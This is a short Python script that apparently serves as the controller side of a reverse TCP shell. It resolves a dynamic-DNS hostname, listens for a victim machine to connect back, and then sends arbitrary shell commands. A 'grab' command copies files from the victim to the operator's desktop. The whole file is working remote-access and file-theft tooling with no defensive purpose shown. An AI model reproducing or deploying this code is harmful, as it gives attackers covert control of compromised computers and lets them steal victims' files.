#  grab DNS   reverse tcp
import os
import socket


def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split("*")
    # the path in your machine
    f = open('/Users/ilya/Desktop ' + path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print('[-] Unable to find out the file')
            break
        f.write(bits)


def connecting(ip):
    s = socket.socket()
    s.bind((ip, 4448))
    s.listen(1)
    print('[+] Listening for income TCP connection on port 8080')
    conn, addr = s.accept()
    print('[+]We got a connection from', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break
        elif 'grab' in command:
            transfer(conn, command)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode("utf-8", "ignore"))


def main():
    ip = socket.gethostbyname("spetsar.ddns.net")
    connecting(ip)


main()
